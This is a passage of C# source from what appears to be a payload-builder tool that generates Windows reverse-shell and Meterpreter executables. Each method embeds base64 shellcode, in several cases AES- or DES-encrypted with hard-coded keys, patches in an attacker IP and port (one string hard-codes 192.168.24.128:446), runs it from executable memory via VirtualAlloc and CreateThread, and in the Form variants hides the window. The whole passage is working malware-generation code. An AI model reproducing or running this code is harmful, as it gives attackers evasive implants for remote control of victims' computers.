                "using System;using System.IO;using System.Runtime.InteropServices;using System.Security.Cryptography;using System.Text;namespace MeterpreterBuilder{ class x64ReverseMeterpreter { static void Main(string[] args) { RunMeterpreter(\"192.168.24.128\", \"446\"); var str = Convert.ToString(Console.ReadLine()); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[1] = port1Byte; shellCodePacket[2] = port2Byte; } } else { shellCodePacket[1] = port1Byte; shellCodePacket[2] = Convert.ToByte(inputPort); } shellCodePacket[3] = octByte1; shellCodePacket[4] = octByte2; shellCodePacket[5] = octByte3; shellCodePacket[6] = octByte4; shellCodePacket[7] = 0x41; shellCodePacket[8] = 0x54; string shellCodeRaw = \"iY/kgIOjsd/HnIEHMT18yCQBU7vmDRCa3dWx9iP64CvcS06r9J2HOfbbNkxMSzhadNQcECJLTLJLe1b5fmpmj/+dZoXI+/epDw7P48sRUxPeX9lj7mwLWgQUB8IYqJfZ/98W9glWMcz6PqrAd6vkW96TS2AmyXB/sCLfnBdLYPl6+fNwTxmR79N1KJ35U0MBiq0733Ot7cadDqqWSn91lRsRkcPY7V/nsTMy0n3eVUtX7q5LXP22UCdqokQmTTHCdM0EE8rx02+qge/CkCKU3GiVOwKJvP1WbIiFPa476r+3DZDk4V9+yiiUu3eqyvivSzeqf5uPyyQIK/IOvQePyYrBDi1s4ruJU1EYcSPTfAJwBbEYUToXgrsohcj260T8GJ4K/KJjCpsQ3tM70H9+cXpslDCpqBCXnmvMvBrbHG3Ux1sD+vVXj7X7Ww8xUsV8jEvSt5wLmMJHWDgSQXlzCH331dErZ4kt3m+zQey8CFVjS21VbQPoAeeFKVaN3L3JCNuYOVVo59PXm0+jtv3ILSeveI0SN1SvjOmj/oQvKNEF5OC1znM0fDmwLXGioyZki7mHCJXWuhnCVqpF1lr3JJC/KolquqnkqhQFxgR0ZCsYxpQvUew7k1UlL4TTxgBlXz11R+VV0v/rtJDG83lzP/cxhdwv/yVwWsUCbce2SoHe3346GkomyolQzSp+zQIk+mpRYLXTAizeYnTdTU9FHfM+Gy+cNuiKdrHDntscVHgubuqXkAII52D3ie35NQbFIYnBPNZHHDpjHne/7lhHn0WX0ayjazeRCPEefzZ/LdjSbgyG4iLyqYqQR5YZrh/8tUUZgjCR60zf4VVzCUsj+5ZalqyBddM292lEy6UqQyaLN6SsO/HcAwnLo8vMLaOp\"; string s3 = Convert.ToBase64String(shellCodePacket); var decryptShellCode = Encrypter.DecryptAes(shellCodeRaw, \"DM2ygEDf~CO9ERc:@/FrhX.n)P\"); string newShellCode = decryptShellCode.Replace(\"ABFcwKiLgUFU\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypt.DecryptAesCsharpString() + " } }";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_x64_reverse_aes.exe", strMtr, "x64");
            ReturnMessageBox(randomFileName + "_x64_reverse_aes.exe", compiler.isCreated);
        }
        public void Savex64ReverseMeterpreterAes()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypt = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\")); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[1] = port1Byte; shellCodePacket[2] = port2Byte; } } else { shellCodePacket[1] = port1Byte; shellCodePacket[2] = Convert.ToByte(inputPort); } shellCodePacket[3] = octByte1; shellCodePacket[4] = octByte2; shellCodePacket[5] = octByte3; shellCodePacket[6] = octByte4; shellCodePacket[7] = 0x41; shellCodePacket[8] = 0x54; string shellCodeRaw = \"iY/kgIOjsd/HnIEHMT18yCQBU7vmDRCa3dWx9iP64CvcS06r9J2HOfbbNkxMSzhadNQcECJLTLJLe1b5fmpmj/+dZoXI+/epDw7P48sRUxPeX9lj7mwLWgQUB8IYqJfZ/98W9glWMcz6PqrAd6vkW96TS2AmyXB/sCLfnBdLYPl6+fNwTxmR79N1KJ35U0MBiq0733Ot7cadDqqWSn91lRsRkcPY7V/nsTMy0n3eVUtX7q5LXP22UCdqokQmTTHCdM0EE8rx02+qge/CkCKU3GiVOwKJvP1WbIiFPa476r+3DZDk4V9+yiiUu3eqyvivSzeqf5uPyyQIK/IOvQePyYrBDi1s4ruJU1EYcSPTfAJwBbEYUToXgrsohcj260T8GJ4K/KJjCpsQ3tM70H9+cXpslDCpqBCXnmvMvBrbHG3Ux1sD+vVXj7X7Ww8xUsV8jEvSt5wLmMJHWDgSQXlzCH331dErZ4kt3m+zQey8CFVjS21VbQPoAeeFKVaN3L3JCNuYOVVo59PXm0+jtv3ILSeveI0SN1SvjOmj/oQvKNEF5OC1znM0fDmwLXGioyZki7mHCJXWuhnCVqpF1lr3JJC/KolquqnkqhQFxgR0ZCsYxpQvUew7k1UlL4TTxgBlXz11R+VV0v/rtJDG83lzP/cxhdwv/yVwWsUCbce2SoHe3346GkomyolQzSp+zQIk+mpRYLXTAizeYnTdTU9FHfM+Gy+cNuiKdrHDntscVHgubuqXkAII52D3ie35NQbFIYnBPNZHHDpjHne/7lhHn0WX0ayjazeRCPEefzZ/LdjSbgyG4iLyqYqQR5YZrh/8tUUZgjCR60zf4VVzCUsj+5ZalqyBddM292lEy6UqQyaLN6SsO/HcAwnLo8vMLaOp\"; string s3 = Convert.ToBase64String(shellCodePacket); var decryptShellCode = Encrypter.DecryptAes(shellCodeRaw, \"DM2ygEDf~CO9ERc:@/FrhX.n)P\"); string newShellCode = decryptShellCode.Replace(\"ABFcwKiLgUFU\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypt.DecryptAesCsharpString() + " } } ";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_x64_reverse_aes.exe", strMtr, "x64");
            ReturnMessageBox(randomFileName + "_x64_reverse_aes.exe", compiler.isCreated);
        }
        public void SaveReverseShellConsole()
        {
            var randomFileName = RandomFileName(0, 5);
            var strMtr =
                "using System; using System.Runtime.InteropServices; namespace MeterpreterBuilder { class x86ReverseShell { static void Main(string[] args) { RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\"); var str = Convert.ToString(Console.ReadLine()); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = octByte1; shellCodePacket[1] = octByte2; shellCodePacket[2] = octByte3; shellCodePacket[3] = octByte4; shellCodePacket[4] = 0x68; shellCodePacket[5] = 0x02; shellCodePacket[6] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[7] = port1Byte; shellCodePacket[8] = port2Byte; } } else { shellCodePacket[7] = port1Byte; shellCodePacket[8] = Convert.ToByte(inputPort); } string shellCodeRaw = \"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagpowKgYgGgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O78LWiVmoAU//V\"; string s3 = Convert.ToBase64String(shellCodePacket); string newShellCode = shellCodeRaw.Replace(\"wKgYgGgCABFc\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } }";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_reverse_shell.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_reverse_shell.exe", compiler.isCreated);
        }
        public void SaveReverseShell()
        {
            var randomFileName = RandomFileName(0, 5);
            var strMtr =
                "using System; using System.Runtime.InteropServices; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\")); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = octByte1; shellCodePacket[1] = octByte2; shellCodePacket[2] = octByte3; shellCodePacket[3] = octByte4; shellCodePacket[4] = 0x68; shellCodePacket[5] = 0x02; shellCodePacket[6] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[7] = port1Byte; shellCodePacket[8] = port2Byte; } } else { shellCodePacket[7] = port1Byte; shellCodePacket[8] = Convert.ToByte(inputPort); } string shellCodeRaw = \"/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagpowKgYgGgCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O78LWiVmoAU//V\"; string s3 = Convert.ToBase64String(shellCodePacket); string newShellCode = shellCodeRaw.Replace(\"wKgYgGgCABFc\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); } } ";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_reverse_shell.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_reverse_shell.exe", compiler.isCreated);
        }
        public void SaveReverseShellAesConsole()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypt = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; namespace MeterpreterBuilder { class x86ReverseShell { static void Main(string[] args) { RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\"); var str = Convert.ToString(Console.ReadLine()); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = octByte1; shellCodePacket[1] = octByte2; shellCodePacket[2] = octByte3; shellCodePacket[3] = octByte4; shellCodePacket[4] = 0x68; shellCodePacket[5] = 0x02; shellCodePacket[6] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[7] = port1Byte; shellCodePacket[8] = port2Byte; } } else { shellCodePacket[7] = port1Byte; shellCodePacket[8] = Convert.ToByte(inputPort); } string shellCodeRaw = \"W/W2qLp7ZelD+Fn3zOEaaaCgDGmBJGkTUQR5oyHcmzBtfJNvpLmygAHoBpSw8fhNqjz4eXkAYSqb2O6w58Nm+0fMTPzpVAvKY5avxI+9qsvUbsR8hUMeiXWXa3IsKySDeEj86ox3PRsft3Adg7XX2azacBUOCpRPOvU9TjevhvytOawjs0szJ3mpgLzxKqck3LDas5XLz5UFH253m7RPmG/+pGh9i7PqPNmJrZNKDxkIyh7HUwiJdAgQfpQN3egrapvOZL33752mwznV7IvDLhtVKt7umDZFlcTvfdmW7RTx8f7YSVpneFlGs57T1Jt8bWSHuC9+iB4cGEZ+E6vd3aBalFZATPOZmN5RS4xp+YgQ4PaeOakYGF2LtLEVk7pSpjL5SJk32QijUDfCVorwXgyPD5scn6I5W7gWdz7n2ML4zbKBOYBUFRyZLZpcNG7gm4ESJS+ihAmBas6k/cg1IxBSK1YptJN5n/rOm3v5HzKIQ43aDw8lUD3w0kQ1bl3aCMYzX6smCs+KnwXjOf+B3qf2vG5t2rI+cqHao+fOxq8tLfcOxCLvpWHLu6HW2mWs/pf3oyNWrNLZkqB2QCoy8g==\"; string s3 = Convert.ToBase64String(shellCodePacket); var decryptShellCode = Encrypter.DecryptAes(shellCodeRaw, \"%HR$L-:#upg5cW7kDeva}aOkjK\"); string newShellCode = decryptShellCode.Replace(\"wKgYgGgCABFc\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypt.DecryptAesCsharpString() + " } }";
            var compiler = new Compiler();
            compiler.Console(randomFileName, "_reverse_shell_aes.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_reverse_shell_aes.exe", compiler.isCreated);
        }
        public void SaveReverseShellAes()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypt = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; using System.Threading.Tasks; using System.Windows.Forms; namespace MeterpreterForm { public partial class Form1 : Form { public Form1() { InitializeComponent(); } private void Form1_Load(object sender, EventArgs e) { this.Hide(); Task.Factory.StartNew(() => RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\")); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = octByte1; shellCodePacket[1] = octByte2; shellCodePacket[2] = octByte3; shellCodePacket[3] = octByte4; shellCodePacket[4] = 0x68; shellCodePacket[5] = 0x02; shellCodePacket[6] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[7] = port1Byte; shellCodePacket[8] = port2Byte; } } else { shellCodePacket[7] = port1Byte; shellCodePacket[8] = Convert.ToByte(inputPort); } string shellCodeRaw = \"W/W2qLp7ZelD+Fn3zOEaaaCgDGmBJGkTUQR5oyHcmzBtfJNvpLmygAHoBpSw8fhNqjz4eXkAYSqb2O6w58Nm+0fMTPzpVAvKY5avxI+9qsvUbsR8hUMeiXWXa3IsKySDeEj86ox3PRsft3Adg7XX2azacBUOCpRPOvU9TjevhvytOawjs0szJ3mpgLzxKqck3LDas5XLz5UFH253m7RPmG/+pGh9i7PqPNmJrZNKDxkIyh7HUwiJdAgQfpQN3egrapvOZL33752mwznV7IvDLhtVKt7umDZFlcTvfdmW7RTx8f7YSVpneFlGs57T1Jt8bWSHuC9+iB4cGEZ+E6vd3aBalFZATPOZmN5RS4xp+YgQ4PaeOakYGF2LtLEVk7pSpjL5SJk32QijUDfCVorwXgyPD5scn6I5W7gWdz7n2ML4zbKBOYBUFRyZLZpcNG7gm4ESJS+ihAmBas6k/cg1IxBSK1YptJN5n/rOm3v5HzKIQ43aDw8lUD3w0kQ1bl3aCMYzX6smCs+KnwXjOf+B3qf2vG5t2rI+cqHao+fOxq8tLfcOxCLvpWHLu6HW2mWs/pf3oyNWrNLZkqB2QCoy8g==\"; string s3 = Convert.ToBase64String(shellCodePacket); var decryptShellCode = Encrypter.DecryptAes(shellCodeRaw, \"%HR$L-:#upg5cW7kDeva}aOkjK\"); string newShellCode = decryptShellCode.Replace(\"wKgYgGgCABFc\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); " + encrypt.DecryptAesCsharpString() + " } } ";
            var compiler = new Compiler();
            compiler.Form(randomFileName, @"_reverse_shell_aes.exe", strMtr, "x86");
            ReturnMessageBox(randomFileName + "_reverse_shell_aes.exe", compiler.isCreated);
        }
        public void SaveReverseShellDesConsole()
        {
            var randomFileName = RandomFileName(0, 5);
            var encrypter = new Encrypter();
            var strMtr =
                "using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; namespace MeterpreterBuilder { class x86ReverseShell { static void Main(string[] args) { RunMeterpreter(\"" +
                Ip + "\", \"" + Port +
                "\"); var str = Convert.ToString(Console.ReadLine()); } public static void RunMeterpreter(string ip, string port) { try { var ipOctetSplit = ip.Split('.'); byte octByte1 = Convert.ToByte(ipOctetSplit[0]); byte octByte2 = Convert.ToByte(ipOctetSplit[1]); byte octByte3 = Convert.ToByte(ipOctetSplit[2]); byte octByte4 = Convert.ToByte(ipOctetSplit[3]); int inputPort = Int32.Parse(port); byte port1Byte = 0x00; byte port2Byte = 0x00; byte[] shellCodePacket = new byte[9]; shellCodePacket[0] = octByte1; shellCodePacket[1] = octByte2; shellCodePacket[2] = octByte3; shellCodePacket[3] = octByte4; shellCodePacket[4] = 0x68; shellCodePacket[5] = 0x02; shellCodePacket[6] = 0x00; if (inputPort > 256) { int portOct1 = inputPort / 256; int portOct2 = portOct1 * 256; int portOct3 = inputPort - portOct2; int portoct1Calc = portOct1 * 256 + portOct3; if (inputPort == portoct1Calc) { port1Byte = Convert.ToByte(portOct1); port2Byte = Convert.ToByte(portOct3); shellCodePacket[7] = port1Byte; shellCodePacket[8] = port2Byte; } } else { shellCodePacket[7] = port1Byte; shellCodePacket[8] = Convert.ToByte(inputPort); } string shellCodeRaw = \"4uYpbVFme1p22FIRO7uPcWtpQ8U53JNgFavqv8nl9TSgX5bE3FJTd3gvaIKtg5E0w0+Vle2+yvDbbsugcbAdrgHhfvH7teJJakBcuU4BwKBSqyvhf6atbDgT+Ta2Y8zljOfozgeEYyvbVJ6HAMst7F0KIxmbK0sUSdVxoRfrJk/aBvskxHChGHHkOcrR0I2Wuk2fbwx/ajBXDYx3mJh2B++5RdPwq38MlVCkNUoAP4b+MAsYCkHCNWRpiRqnWS0sgDFl90RHsHOmOkVwO4QB3bstgw/58gta1Fh5/7Pn2xOqzFS/j6OU473GrAatGw57F0jEZzU1fFht49VaT4TEY/O8f1nIh+S/oNDkZkKg6aUn8uODn7lsuO4bRHWiBooyjLuwLvPqEzGHHb1uK1s/nnLNSC1YGq2zV/GxhAP81rsNw38aF47+w3p0oDOJpsXx63jmhyvyKPpq3GBRsUkJZqmI+is+4CMph0JCuZGXb4OVmIRCZwuLl5CGLkyQrPLcvTmSi0FXpvXUPNCEff+Dd2bJdma2ixBRwvijNMjN7tbagYSq4qyqJ14LirTRTJPFirM8jKvwukmopYdli2q3ww==\"; string s3 = Convert.ToBase64String(shellCodePacket); Encrypter encrypter = new Encrypter(); string shellCodeDecrypt = encrypter.DecryptDes(shellCodeRaw, \"?(#(?5:3\"); string newShellCode = shellCodeDecrypt.Replace(\"wKgYgGgCABFc\", s3); byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode); UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); return; } catch (Exception e) { Console.WriteLine(e); throw; } } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] private static extern UInt32 